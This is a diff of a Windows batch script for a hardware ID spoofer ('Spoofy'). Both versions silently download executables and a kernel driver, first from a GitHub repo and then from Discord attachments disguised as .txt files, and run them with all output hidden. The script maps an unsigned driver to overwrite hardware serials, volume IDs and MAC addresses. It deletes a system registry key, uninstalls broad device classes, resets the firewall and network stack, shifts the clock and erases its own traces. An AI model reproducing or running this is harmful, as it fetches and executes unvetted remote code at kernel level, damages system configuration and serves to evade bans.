@@ -1,18 +1,29 @@
-@ECHO ON & TITLE       
-powershell -Command "Set-Date -Date (Get-Date).AddDays(-50) | Out-Null" >NUL 2>&1
-MKDIR "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
-CD /D "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
-curl -s -g -L -o "DevManView.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/DevManView.exe$"  >NUL 2>&1
-curl -s -g -L -o "devcon.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/devcon.exe$"  >NUL 2>&1
-curl -s -g -L -o "VolumeID.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/VolumeID.exe$"  >NUL 2>&1
-curl -s -g -L -o "CupFixerx64.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/CupFixerx64.exe$"  >NUL 2>&1
-curl -s -g -L -o "CupFixerx64.sys" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/CupFixerx64.sys$"  >NUL 2>&1
-:: Hardware Identification Changer/Spoofer
-SET "KernleMapper=CupFixerx64.exe" >nul 2>&1
-SET "Driver=CupFixerx64.sys" >nul 2>&1
-sc stop winmgmt >nul 2>&1 & sc start winmgmt >nul 2>&1
-REG DELETE "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System" /F >nul 2>&1
-CALL %KernleMapper% %Driver% >nul 2>&1
+@ECHO ON 
+::: Args
+Set "Download=curl -s -g -L -o"
+
+REM Making Directiory 
+Mountvol "x:" /s >Nul 2>&1 & MKDIR "x:\Spoofy" >Nul 2>&1 & CD /D "x:\Spoofy" >Nul 2>&1
+
+REM Spoofing VolumeID
+setlocal EnableDelayedExpansion
+Set "VolumeID=x.exe"
+%Download% "%VolumeID%" "https://cdn.discordapp.com/attachments/1206253821861429318/1206259383105753208/VolumeID-exe-.txt?ex=65db5b98&is=65c8e698&hm=4d12e9b52f4f7e859ea300f575e9f1a7ee834e2e816b7a467eda7b70ff2d0cba&"
+for %%p in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do (
+    SET "VID1=" & SET /A VID1=(!RANDOM!%%(8999-0+0^)^)+999
+    if exist %%p:\nul start /B %VolumeID% %%p: %VID1%-%VID2% -nobanner >nul 2>&1
+    if exist %%p:\nul start /B %VolumeID% %%p: !VID1!-!VID2! -nobanner >nul 2>&1
+)
+DEL /S /Q "%VolumeID%" >NUL 2>&1
+endlocal
+
+REM [ Spoofing Hardware ]
+setlocal EnableDelayedExpansion
+Set "KernleMapper=CupFixerx64.exe"
+%Download% "%KernleMapper%" "https://cdn.discordapp.com/attachments/1206253821861429318/1206259379964350554/CupFixerx64-exe-.txt?ex=65db5b97&is=65c8e697&hm=0c62e878c769ad7c1f6453564e1bd14f2ad2bcf2345edec70b2448e2127f07c8&"
+Set "KernleMapperDriver=CupFixerx64.sys"
+%Download% "%KernleMapperDriver%" "https://cdn.discordapp.com/attachments/1206253821861429318/1206259380643823616/CupFixerx64-sys-.txt?ex=65db5b97&is=65c8e697&hm=9b1473c7b9bf16c1fa39fdc7ac0def87d63548b64e82d7b9d437f8ec508b51c6&" 
+CALL %KernleMapper% %KernleMapperDriver% >nul 2>&1
 %KernleMapper% /PSN "%RANDOM%%RANDOM%%RANDOM%" >NUL 2>&1
 %KernleMapper% /PAT "%RANDOM%%RANDOM%%RANDOM%" >NUL 2>&1
 %KernleMapper% /PPN "%RANDOM%%RANDOM%%RANDOM%" >NUL 2>&1
@@ -38,93 +49,41 @@ CALL %KernleMapper% %Driver% >nul 2>&1
 %KernleMapper% /SK "%RANDOM%%RANDOM%%RANDOM%" >NUL 2>&1
 %KernleMapper% /BM "@agr3fox" >NUL 2>&1
 %KernleMapper% /SU AUTO >NUL 2>&1
-:: VolumeID Changer/Spoofer
-setlocal EnableDelayedExpansion
-for %%p in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do (
-    SET "VID1=" & SET /A VID1=(!RANDOM!%%(8999-0+0^)^)+999
-    if exist %%p:\nul start /B VolumeID.exe %%p: %VID1%-%VID2% -nobanner >nul 2>&1
-    if exist %%p:\nul start /B VolumeID.exe %%p: !VID1!-!VID2! -nobanner >nul 2>&1
-)
-DEL /S /Q "VolumeID.exe" >NUL 2>&1
+DEL /S /Q "%KernleMapper%" >NUL 2>&1 & DEL /S /Q "%KernleMapperDriver%" >NUL 2>&1
 endlocal
-:: Device Cleaner
-setlocal EnableDelayedExpansion
-for %%p in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %%p:\nul DevManView.exe /uninstall "%%p:\" >NUL 2>&1
-endlocal
-setlocal EnableDelayedExpansion
-DevManView.exe /uninstall "Disk&*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "SWD\WPDBUSENUM*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "USBSTOR*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "SCSI\Disk*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "STORAGE*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "Motherboard*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "Volume*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "Microsoft*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "System*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "ACPI\*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "Remote*" /use_wildcard >NUL 2>&1
-DevManView.exe /uninstall "Standard*" /use_wildcard >NUL 2>&1
-DEL /S /Q "DevManView.exe" >NUL 2>&1
-endlocal
-:: Scan Device
-start /B devcon.exe rescan
-DEL /S /Q "devcon.exe" >NUL 2>&1
-:: MAC Address Changer
-SETLOCAL ENABLEEXTENSIONS
-SETLOCAL ENABLEDELAYEDEXPANSION
-FOR /F "tokens=1" %%a IN ('wmic nic where physicaladapter^=true get deviceid ^| findstr [0-9]') DO (
-CALL :MAC
-FOR %%b IN (0 00 000) DO (
-REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002bE10318}\%%b%%a >NUL 2>NUL && REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002bE10318}\%%b%%a /v NetworkAddress /t REG_SZ /d !MAC!  /f >NUL 2>NUL
-)
-)
-FOR /F "tokens=1" %%a IN ('wmic nic where physicaladapter^=true get deviceid ^| findstr [0-9]') DO (
-FOR %%b IN (0 00 000) DO (
-REG QUERY HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002bE10318}\%%b%%a >NUL 2>NUL && REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002bE10318}\%%b%%a /v PnPCapabilities /t REG_DWORD /d 24 /f >NUL 2>NUL
-)
-)
-FOR /F "tokens=2 delims=, skip=2" %%a IN ('"wmic nic where (netconnectionid like '%%') get netconnectionid,netconnectionstatus /format:csv"') DO (
-netsh interface set interface name="%%a" disable >NUL 2>NUL
-netsh interface set interface name="%%a" enable >NUL 2>NUL
-)
-netsh int ip set address "%%j" dhcp >NUL 2>NUL
-netsh int ip set dns "%%j" dhcp >NUL 2>NUL
-netsh interface set interface name="%%j" admin=enabled >NUL 2>NUL
-certutil -URLCache * delete >NUL 2>NUL
-netsh int ip reset >NUL 2>NUL
-netsh int ipv4 reset >NUL 2>NUL
-netsh int ipv6 reset >NUL 2>NUL
-ipconfig / >nul >NUL 2>NUL
-ipconfig /release >NUL 2>NUL
-ipconfig /renew >NUL 2>NUL
-ipconfig /flushdns >NUL 2>NUL
-netsh advfirewall reset >NUL 2>NUL
-netsh winsock reset >NUL 2>NUL
-netsh int ip reset >NUL 2>NUL
-netsh winsock reset >NUL 2>NUL
-netsh advfirewall reset >NUL 2>NUL
-GOTO :EOF
-:internettest
-ping www.google.com -n 1 | find "" > nul
-if errorlevel==1 goto internettest
-REG ADD "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System" /F
-sc stop winmgmt >nul 2>&1 & sc start winmgmt >nul 2>&1
-powershell -Command "Set-Date -Date (Get-Date).AddDays(+50) | Out-Null"
-CD /D "C:\" >nul 2>&1 & RMDIR /S /Q "C:\Users\Administrator\Contacts\5P00FY" >nul 2>&1
 
-:Args
-    :MAC
-    SET COUNT=0
-    SET GEN=ABCDEF0123456789
-    SET GEN2=26AE
-    SET MAC=
-    :MACLOOP
-    SET /a COUNT+=1
-    SET RND=%random%
-    SET /A RND=RND%%16
-    SET RNDGEN=!GEN:~%RND%,1!
-    SET /A RND2=RND%%4
-    SET RNDGEN2=!GEN2:~%RND2%,1!
-    IF "!COUNT!"  EQU "2" (SET MAC=!MAC!!RNDGEN2!) ELSE (SET MAC=!MAC!!RNDGEN!)
-    IF !COUNT!  LEQ 11 GOTO MACLOOP
-GOTO:EOF
+REM [ Device Cleaning ]
+setlocal EnableDelayedExpansion
+Set "DeviceCleaner=x.exe"
+%Download% "%DeviceCleaner%" "https://cdn.discordapp.com/attachments/1206253821861429318/1206259381273104384/DeviceCleaner-exe-.txt?ex=65db5b97&is=65c8e697&hm=aad6eb9e7918a27b8620e5ba2fc669afe141fcca0fd1c445a7c5a927a808b48b&"
+for %%p in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %%p:\nul %DeviceCleaner% /uninstall "%%p:\" >NUL 2>&1
+%DeviceCleaner% /uninstall "Disk&*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "SWD\WPDBUSENUM*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "USBSTOR*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "SCSI\Disk*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "STORAGE*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "Motherboard*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "Volume*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "Microsoft*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "System*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "ACPI\*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "Remote*" /use_wildcard >NUL 2>&1
+%DeviceCleaner% /uninstall "Standard*" /use_wildcard >NUL 2>&1
+DEL /S /Q "%DeviceCleaner%" >NUL 2>&1
+endlocal
+
+REM Change MAC Address
+Set "MAC-Changer=x.exe"
+%Download% "%MAC-Changer%" "https://cdn.discordapp.com/attachments/1206253821861429318/1206259382430474281/Mac-Address-exe-.txt?ex=65db5b97&is=65c8e697&hm=6d0d47b805df8669b895a88000ac4abf47bd0bbc2d108765a67dbf3c31c0caf6&"
+DEL /S /Q "%MAC-Changer%" >NUL 2>&1
+
+REM Scan Device 
+SetLocal
+Set "DeviceScanner=x.exe"
+%Download% "%DeviceScanner%" "https://cdn.discordapp.com/attachments/1206253821861429318/1206259381876818000/DeviceScan-exe-.txt?ex=65db5b97&is=65c8e697&hm=cec55a23a748ea0b0deb106a9f669da70fa4009904e2c0b263df73785b8fd4b8&"
+Start /B %DeviceScanner% rescan
+DEL /S /Q %DeviceScanner%
+EndLocal
+SetLocal
+CD /D "%SystemDrive%\" & RMDIR /S /Q "x:\Spoofy"
+PAUSE > NUL
